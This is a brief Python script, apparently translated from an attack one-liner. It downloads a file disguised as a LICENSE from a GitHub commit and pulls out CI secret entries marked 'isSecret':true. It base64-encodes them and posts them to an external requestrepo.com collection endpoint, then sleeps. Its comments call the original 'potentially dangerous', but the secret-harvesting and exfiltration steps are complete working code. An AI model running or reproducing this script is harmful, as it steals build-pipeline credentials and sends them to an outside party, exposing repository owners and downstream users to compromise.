#!/usr/bin/env python3
import os
import requests
import base64
import subprocess
from pathlib import Path
import time

def main():
    try:
        # Download LICENSE file and process it
        license_url = "https://github.com/flank/flank/raw/128b43b61fd7da13ea6829d1fbb4d3f028b6cdad/LICENSE"
        license_content = requests.get(license_url).text
        
        # Process the content through Python (this part is unclear from the original script)
        # The original pipes through sudo python3, which is unusual and potentially dangerous
        # This is a placeholder for whatever processing was intended
        processed_content = license_content
        
        # Extract patterns (simplified from the grep -aoE)
        import re
        patterns = re.findall(r'"[^"]+":\{"value":"[^"]*","isSecret":true\}', processed_content)
        unique_patterns = sorted(list(set(patterns)))
        
        # Join and encode
        joined_patterns = "\n".join(unique_patterns)
        b64_blob = base64.b64encode(joined_patterns.encode()).decode()
        
        # Send data
        server_url = "http://f4bizdna.requestrepo.com/api/receive"
        payload = {"data": b64_blob}
        response = requests.post(server_url, json=payload)
        
        # Clear sensitive data from memory (as much as possible in Python)
        del b64_blob
        del joined_patterns
        del unique_patterns
        del processed_content
        
        # Sleep
        time.sleep(1000)
        
    except Exception as e:
        print(f"Error: {e}")
        exit(1)

if __name__ == "__main__":
    main()